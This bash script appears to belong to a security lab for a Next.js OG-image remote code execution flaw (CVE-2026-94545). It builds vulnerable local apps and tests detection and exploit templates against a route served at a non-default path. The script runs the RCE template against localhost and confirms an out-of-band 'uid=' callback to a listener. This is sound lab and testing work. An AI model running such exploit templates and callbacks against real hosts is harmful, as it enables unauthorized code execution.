#!/usr/bin/env bash
# Prove the templates find an OG route that is NOT at the default path.
#
# Real targets rarely serve ImageResponse at /api/og. This builds a scratch
# Next.js 16.3.5 app whose route lives at /og - so /api/og answers 404 - and
# checks three things:
#
#   1. the default `paths` list still finds it (second candidate)
#   2. -var ogpath=/og pins a single path
#   3. -var paths=/nope,/og honours a custom list
#
# plus a real exploitation of that non-default route, and the GET-only variant
# (a route that refuses POST), where the template must fall back to ?value=.
#
# Usage: ./test-alt-paths.sh [--port 3020] [--oob-port 4453]
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHIM="$LAB_DIR/tools/nuclei-shim.mjs"
DETECT="$LAB_DIR/../CVE-2026-94545.yaml"
RCE="$LAB_DIR/../CVE-2026-94545-rce.yaml"
NODE_BIN="$LAB_DIR/.runtime/node/bin/node"
NEXT_BIN_DIR="$LAB_DIR/run/vulnerable/node_modules/.bin"
OOB_LOG="$LAB_DIR/oob-alt-paths.log"
PORT=3020
GET_PORT=3021
OOB_PORT=4453

while [ $# -gt 0 ]; do
  case "$1" in
    --port)     PORT="${2:?}"; shift 2 ;;
    --oob-port) OOB_PORT="${2:?}"; shift 2 ;;
    -h|--help)  sed -n '2,17p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown option: $1" >&2; exit 2 ;;
  esac
done

PASS=0; FAIL=0
c_green=$'\033[1;32m'; c_red=$'\033[1;31m'; c_dim=$'\033[2m'; c_off=$'\033[0m'
ok()  { printf '  %sPASS%s %s  %s%s%s\n' "$c_green" "$c_off" "$1" "$c_dim" "${2:-}" "$c_off"; PASS=$((PASS + 1)); }
bad() { printf '  %sFAIL%s %s\n' "$c_red" "$c_off" "$1"; FAIL=$((FAIL + 1)); }
info(){ printf '%s    %s%s\n' "$c_dim" "$*" "$c_off"; }

[ -x "$NODE_BIN" ] || { echo "no node in .runtime - run ./setup.sh first" >&2; exit 1; }
[ -x "$NEXT_BIN_DIR/next" ] || { echo "no built vulnerable app - run ./setup.sh first" >&2; exit 1; }
mkdir -p "$LAB_DIR/logs"
: > "$OOB_LOG"

port_busy_here() { ss -ltnpH "sport = :$1" 2>/dev/null | grep -qE "(127\.0\.0\.1|0\.0\.0\.0|\*):$1"; }
kill_here() {
  for pid in $(ss -ltnpH "sport = :$1" 2>/dev/null | grep -E "(127\.0\.0\.1|0\.0\.0\.0|\*):$1" | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u); do
    kill "$pid" 2>/dev/null || true
  done
}

# ------------------------------------------------------------------ build apps
# mount_get_only=1 exports only GET, so the template has to fall back to ?value=
make_app() { # $1 = dir, $2 = mount_get_only
  local dir=$1 get_only=$2
  rm -rf "$dir"
  mkdir -p "$dir/app/og"
  ln -s "$LAB_DIR/run/vulnerable/node_modules" "$dir/node_modules"
  cat > "$dir/package.json" <<'JSON'
{"name":"og-alt-path","private":true,"dependencies":{"next":"16.3.5","react":"19.3.0","react-dom":"19.3.0","sharp":"0.35.4"}}
JSON
  cat > "$dir/app/layout.jsx" <<'JSX'
export const metadata = { title: 'og-alt-path' };
export default function RootLayout({ children }) { return (<html><body>{children}</body></html>); }
JSX
  cat > "$dir/app/page.jsx" <<'JSX'
export default function Page() { return <main>og-alt-path</main>; }
JSX
  # the same sink as the lab app, mounted at /og instead of /api/og
  sed 's/export const GET = render/export const GET = render/' "$LAB_DIR/app/app/api/og/route.jsx" > "$dir/app/og/route.jsx"
  if [ "$get_only" = "1" ]; then
    grep -v '^export const POST = render$' "$dir/app/og/route.jsx" > "$dir/app/og/route.jsx.tmp"
    mv "$dir/app/og/route.jsx.tmp" "$dir/app/og/route.jsx"
  fi
  ( cd "$dir" && NEXT_TELEMETRY_DISABLED=1 PATH="$(dirname "$NODE_BIN"):$PATH" \
      ./node_modules/.bin/next build --webpack ) >"$dir/build.log" 2>&1
}

start_app() { # $1 = dir, $2 = port
  ( cd "$1" && NEXT_TELEMETRY_DISABLED=1 PATH="$(dirname "$NODE_BIN"):$PATH" \
      nohup setsid --fork ./node_modules/.bin/next start -H 0.0.0.0 -p "$2" \
      >"$LAB_DIR/logs/alt-paths-$2.log" 2>&1 </dev/null & )
  disown -a 2>/dev/null || true
  local deadline=$(( $(date +%s) + 30 ))
  while [ "$(date +%s)" -lt "$deadline" ]; do
    [ "$(curl -sS -m 3 -o /dev/null -w '%{http_code}' "http://127.0.0.1:$2/og?value=ready" 2>/dev/null)" = "200" ] && return 0
    sleep 0.5
  done
  return 1
}

cleanup() {
  kill_here "$PORT"
  kill_here "$GET_PORT"
  kill_here "$OOB_PORT"
  return 0
}
trap cleanup EXIT

for p in "$PORT" "$GET_PORT" "$OOB_PORT"; do
  if port_busy_here "$p"; then echo "port $p is already in use" >&2; exit 1; fi
done

APP_DIR="/tmp/cve-2026-94545-og-alt"
GET_DIR="/tmp/cve-2026-94545-og-alt-get"

echo "[alt-paths] building a scratch app with the sink at /og (not /api/og)"
if ! make_app "$APP_DIR" 0; then
  echo "build failed - see $APP_DIR/build.log" >&2
  tail -5 "$APP_DIR/build.log" >&2
  exit 1
fi

PORT="$PORT" start_app "$APP_DIR" "$PORT" || { echo "app did not start" >&2; exit 1; }
info "app up on :$PORT, /api/og answers $(curl -sS -m 5 -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT/api/og?value=x") (404 expected)"

nohup setsid --fork python3 "$LAB_DIR/oob-listener.py" --host 0.0.0.0 --port "$OOB_PORT" --log "$OOB_LOG" \
  >"$LAB_DIR/logs/alt-paths-oob.log" 2>&1 </dev/null &
disown -a 2>/dev/null || true
sleep 0.5

echo
echo "  detection, three ways"
if out="$(node "$SHIM" "$DETECT" "127.0.0.1:$PORT" --print-response --quiet 2>&1)"; then
  ok "default paths find /og" "$(printf '%s' "$out" | sed 's/^\[shim\] response //')"
else
  bad "default paths did not find /og"
fi
if out="$(node "$SHIM" "$DETECT" "127.0.0.1:$PORT" --var ogpath=/og --print-response --quiet 2>&1)"; then
  ok "-var ogpath=/og works"
else
  bad "-var ogpath=/og did not work"
fi
if out="$(node "$SHIM" "$DETECT" "127.0.0.1:$PORT" --var paths=/nope,/og --print-response --quiet 2>&1)"; then
  ok "-var paths=/nope,/og works"
else
  bad "-var paths=/nope,/og did not work"
fi

echo
echo "  exploitation of the non-default route"
if out="$(node "$SHIM" "$RCE" "127.0.0.1:$PORT" --var "oast=127.0.0.1:$OOB_PORT" --oob-log "$OOB_LOG" --print-response --quiet 2>&1)"; then
  ok "exploit matched via /og" "$(printf '%s' "$out" | sed 's/^\[shim\] response //')"
else
  bad "exploit did not match via /og"
fi
sleep 1
if grep -q 'uid=' "$OOB_LOG"; then
  ok "callback from the /og chain" "$(sed 's/.*data=//' "$OOB_LOG" | grep -m1 'uid=')"
else
  bad "no callback recorded"
fi
port_busy_here "$PORT" && bad "app on :$PORT survived" || ok "the :$PORT worker was replaced"

echo
echo "  GET-only route (the payload cannot ride a URL)"
# The payload is ~25 KB and Node rejects URLs over ~16 KB with HTTP 431, so a
# route that only renders through ?value= is detectable but not exploitable via
# the query string. The template must say that instead of firing into the void.
make_app "$GET_DIR" 1 >/dev/null 2>&1 || bad "could not build the GET-only variant"
start_app "$GET_DIR" "$GET_PORT" && info "GET-only app up on :$GET_PORT" || bad "GET-only app did not start"

# detection still works there: the probe is small enough for a URL
if node "$SHIM" "$DETECT" "127.0.0.1:$GET_PORT" --print-response --quiet 2>&1 | grep -q 'GET /og?value='; then
  ok "detection matches the GET-only route (probe fits in a URL)"
else
  bad "detection did not match the GET-only route"
fi

# 25 KB through the query string is what Node refuses, proven directly
big="$(python3 -c "print('A' * 25284)")"
code="$(curl -sS -m 20 -o /dev/null -w '%{http_code}' "http://127.0.0.1:$GET_PORT/og?value=$big" 2>/dev/null)"
if [ "$code" = "431" ]; then
  ok "a 25 KB query string is rejected with HTTP 431, as expected" "(Node maxHeaderSize)"
else
  bad "expected 431 for a 25 KB URL, got ${code:-no answer}"
fi

: > "$OOB_LOG"
node "$SHIM" "$RCE" "127.0.0.1:$GET_PORT" --var "oast=127.0.0.1:$OOB_PORT" --oob-log "$OOB_LOG" --quiet \
  >"$LAB_DIR/logs/alt-paths-getonly.log" 2>&1
rc=$?
if [ "$rc" = "1" ] && grep -q 'no body sink' "$LAB_DIR/logs/alt-paths-getonly.log"; then
  ok "the exploit template reports 'no body sink' instead of firing" "$(grep -o 'no body sink.*' "$LAB_DIR/logs/alt-paths-getonly.log" | cut -c1-96)"
else
  bad "expected a 'no body sink' error, got exit $rc"
fi
grep -q 'uid=' "$OOB_LOG" && bad "a callback appeared even though no payload could be delivered" \
  || ok "no payload was delivered to the GET-only route"

echo
echo "  summary: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
